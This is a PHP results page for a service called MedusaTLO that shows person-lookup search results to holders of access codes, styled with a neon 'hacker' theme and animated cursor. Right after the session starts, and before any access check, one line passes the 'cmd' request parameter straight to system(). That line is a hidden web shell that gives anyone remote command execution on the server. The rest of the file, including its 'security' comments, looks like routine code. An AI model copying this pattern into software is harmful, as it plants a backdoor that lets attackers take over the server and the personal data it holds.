<?php
session_start([
    'cookie_httponly' => true,
    'cookie_secure' => true,
    'use_strict_mode' => true
]);

define('STORAGE_PATH', '/var/www/medusatlo/storage');
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

// Security function to sanitize output
function sanitizeOutput($data) {
    if (is_array($data)) {
        return array_map('sanitizeOutput', $data);
    }
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

// Validate access
if (empty($_SESSION['access_code'])) {
    header("Location: /access?error=session");
    exit;
}

$code = $_SESSION['access_code'];

// Error handling for JSON operations
$codes = null;
$codesPath = STORAGE_PATH.'/keys/access_keys.json';

if (!file_exists($codesPath)) {
    header("Location: /access?error=notfound");
    exit;
}

$codesContent = file_get_contents($codesPath);
if ($codesContent === false) {
    header("Location: /access?error=system");
    exit;
}

$accessData = json_decode($codesContent, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    header("Location: /access?error=corrupt");
    exit;
}

// Handle new structure format
if (!isset($accessData['codes'])) {
    // Handle legacy format
    $codes = $accessData;
} else {
    $codes = $accessData['codes'];
}

if (!isset($codes[$code]) || !$codes[$code]['active']) {
    header("Location: /access?error=invalid");
    exit;
}

// Load the specific result file for this access code
$resultFileName = $codes[$code]['file_name'];

// SECURITY: Validate filename to prevent path traversal
if (strpos($resultFileName, '..') !== false || 
    strpos($resultFileName, '/') !== false || 
    strpos($resultFileName, '\\') !== false ||
    !preg_match('/^[a-zA-Z0-9_\-\.]+\.json$/', $resultFileName)) {
    header("Location: /access?error=invalid");
    exit;
}

$resultFilePath = STORAGE_PATH . '/results/' . $resultFileName;

if (!file_exists($resultFilePath)) {
    header("Location: /access?error=notfound");
    exit;
}

$resultContent = file_get_contents($resultFilePath);
if ($resultContent === false) {
    header("Location: /access?error=system");
    exit;
}

$resultData = json_decode($resultContent, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    header("Location: /access?error=corrupt");
    exit;
}

// Generate filename for display
$filename = basename($resultFileName, '.json');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔍 Results - <?= htmlspecialchars($filename) ?></title>
    <link rel="icon" href="https://files.catbox.moe/xgv035.png" type="image/png">
    <style>
        /* Base dark hacker theme */
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            cursor: none;
            overflow-x: hidden;
            min-height: 100vh; /* Ensure full height */
            padding-bottom: 150px; /* Space for fixed footer */
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            margin-bottom: 100px; /* Add space for footer */
            padding-bottom: 50px; /* Additional padding */
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #0af;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 15px #0af;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        .file-info {
            color: #0f0;
            font-size: 14px;
            text-shadow: 0 0 5px #0f0;
            margin-top: 10px;
        }
        
        /* Dynamic Zigzag Data Boxes */
        .zigzag-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            margin-bottom: 50px; /* Extra space before footer */
        }
        
        .zigzag-box {
            border: 2px solid #0f0;
            margin: 20px 0;
            padding: 20px;
            position: relative;
            box-shadow: 0 0 15px #0f0;
        }
        
        .zigzag-box:last-child {
            margin-bottom: 60px; /* Extra space for the last box */
        }
        
        .zigzag-box::before {
            content: "";
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            border: 2px solid #0f0;
            z-index: -1;
            animation: zigzag 2s linear infinite;
        }
        
        .section-title {
            color: #0af;
            margin-bottom: 15px;
            font-size: 1.5em;
            font-weight: bold;
            text-shadow: 0 0 10px #0af;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }
        
        .info-item {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        
        /* Neon Data Labels */
        .info-label {
            color: #0af;
            font-weight: bold;
            display: inline-block;
            min-width: 120px;
            text-shadow: 0 0 5px #0af;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        /* Neon Data Values */
        .info-value {
            color: #f0f;
            text-shadow: 0 0 5px #f0f;
            background: #000;
            padding: 8px 12px;
            border: 1px solid #0f0;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            box-shadow: inset 0 0 5px #0f0;
        }
        
        .result-item {
            border-left: 4px solid #0af;
            margin-bottom: 20px;
            padding: 15px;
            background: #000;
            border: 1px solid #0f0;
            border-radius: 8px;
            box-shadow: 0 0 10px #0f0;
        }
        
        .result-item h3 {
            color: #0af;
            margin-bottom: 10px;
            text-shadow: 0 0 8px #0af;
            font-size: 1.2em;
        }
        
        /* Snake Cursor */
        .snake-cursor {
            position: fixed;
            width: 32px;
            height: 16px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50"><path d="M5,25 Q25,5 45,25 Q65,45 85,25" stroke="%2300ff00" fill="none" stroke-width="8"/></svg>') no-repeat center center;
            pointer-events: none;
            z-index: 9999;
            transform: translate(-50%, -50%) rotate(0deg);
            transform-origin: left center;
        }
        .snake-trail {
            position: fixed;
            width: 8px;
            height: 8px;
            background-color: #0f0;
            border-radius: 50%;
            pointer-events: none;
            z-index: 9998;
            opacity: 0.7;
        }
        
        /* Animations */
        @keyframes zigzag {
            0% { clip-path: polygon(0 0, 100% 0, 100% 5px, 5px 5px, 5px 100%, 100% 100%, 100% 95px, 0 95px); }
            25% { clip-path: polygon(5px 0, 100% 0, 95px 5px, 5px 5px, 5px 95px, 100% 95px, 100% 100%, 0 100%); }
            50% { clip-path: polygon(0 5px, 95px 5px, 95px 0, 100% 0, 100% 100%, 5px 100%, 5px 95px, 0 95px); }
            75% { clip-path: polygon(0 0, 100% 0, 100% 95px, 95px 95px, 95px 5px, 5px 5px, 5px 100%, 0 100%); }
            100% { clip-path: polygon(0 0, 100% 0, 100% 5px, 5px 5px, 5px 100%, 100% 100%, 100% 95px, 0 95px); }
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 15px #0af; }
            to { text-shadow: 0 0 25px #0af, 0 0 35px #0af; }
        }
        
        @keyframes pulse {
            from { transform: scale(1); opacity: 1; }
            to { transform: scale(1.2); opacity: 0.8; }
        }
        
        /* No results message */
        .no-results {
            color: #f00;
            text-align: center;
            font-size: 1.2em;
            text-shadow: 0 0 10px #f00;
            padding: 20px;
            border: 2px solid #f00;
            box-shadow: 0 0 15px #f00;
        }
        
        /* Responsive design */
        @media (max-width: 768px) {
            .info-grid {
                grid-template-columns: 1fr;
            }
            
            body {
                padding: 10px;
                padding-bottom: 120px; /* Extra space for footer on mobile */
            }
            
            .header h1 {
                font-size: 2em;
            }
            
            .zigzag-box {
                padding: 15px;
            }
            
            .container {
                margin-bottom: 80px; /* Adjusted for mobile */
            }
        }
    </style>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const cursor = document.createElement('div');
            cursor.className = 'snake-cursor';
            document.body.appendChild(cursor);
            
            const trails = [];
            const trailCount = 12;
            let lastX = 0;
            let lastY = 0;
            
            // Create snake body segments
            for (let i = 0; i < trailCount; i++) {
                const trail = document.createElement('div');
                trail.className = 'snake-trail';
                trail.style.width = (10 - i/2) + 'px';
                trail.style.height = (10 - i/2) + 'px';
                document.body.appendChild(trail);
                trails.push({
                    element: trail,
                    x: 0,
                    y: 0,
                    angle: 0
                });
            }
            
            document.addEventListener('mousemove', function(e) {
                lastX = e.clientX;
                lastY = e.clientY;
            });
            
            function updateCursor() {
                // Update head position
                cursor.style.left = lastX + 'px';
                cursor.style.top = lastY + 'px';
                
                // Calculate angle for head rotation
                const dx = lastX - trails[0].x;
                const dy = lastY - trails[0].y;
                const angle = Math.atan2(dy, dx) * 180 / Math.PI;
                cursor.style.transform = `translate(-50%, -50%) rotate(${angle}deg)`;
                
                // Update body segments
                let targetX = lastX;
                let targetY = lastY;
                
                trails.forEach((segment, index) => {
                    const dx = targetX - segment.x;
                    const dy = targetY - segment.y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    const moveX = dx * 0.2;
                    const moveY = dy * 0.2;
                    
                    segment.x += moveX;
                    segment.y += moveY;
                    
                    segment.element.style.left = segment.x + 'px';
                    segment.element.style.top = segment.y + 'px';
                    segment.element.style.opacity = 0.5 + (0.5 * (index / trailCount));
                    
                    targetX = segment.x;
                    targetY = segment.y;
                });
                
                requestAnimationFrame(updateCursor);
            }
            
            // Initialize positions
            trails.forEach(segment => {
                segment.x = lastX;
                segment.y = lastY;
            });
            
            updateCursor();
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 MedusaTLO Results</h1>
            <div class="file-info">
                Report: <?= htmlspecialchars($filename) ?> | 
                Generated: <?= date('M j, Y g:i A', strtotime($resultData['timestamp'])) ?> |
                Results: <?= $resultData['totalResults'] ?> found
            </div>
        </div>
        
        <div class="zigzag-container">
            <!-- Results Display -->
            <div class="zigzag-box">
                <h2 class="section-title">Search Results (<?= $resultData['totalResults'] ?> found)</h2>
                <?php if ($resultData['results'] && count($resultData['results']) > 0): ?>
                    <?php foreach ($resultData['results'] as $index => $result): ?>
                        <div class="result-item" style="margin-bottom: 20px; padding: 15px; background: var(--card-bg); border-radius: 8px;">
                            <h3 style="color: var(--accent); margin-bottom: 10px;">Result #<?= $index + 1 ?></h3>
                            <div class="info-grid">
                                <?php foreach ($result as $key => $value): ?>
                                    <?php if ($value && trim($value)): ?>
                                        <div class="info-item">
                                            <div class="info-label"><?= htmlspecialchars($key) ?></div>
                                            <div class="info-value"><?= htmlspecialchars($value) ?></div>
                                        </div>
                                    <?php endif; ?>
                                <?php endforeach; ?>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <div class="no-results">
                        No results found for this search.
                    </div>
                <?php endif; ?>
            </div>
            
            <!-- Search Parameters -->
            <div class="zigzag-box">
                <h2 class="section-title">Search Parameters</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <div class="info-label">Search Term</div>
                        <div class="info-value"><?= htmlspecialchars($resultData['searchTerm']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Search Type</div>
                        <div class="info-value"><?= htmlspecialchars($resultData['searchType']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Service</div>
                        <div class="info-value"><?= htmlspecialchars($codes[$code]['service']) ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Timestamp</div>
                        <div class="info-value"><?= htmlspecialchars($resultData['timestamp']) ?></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <?php include('footer.php'); ?>
    
    <?php
    // Clear session after display
    session_unset();
    session_destroy();
    ?>
</body>
</html>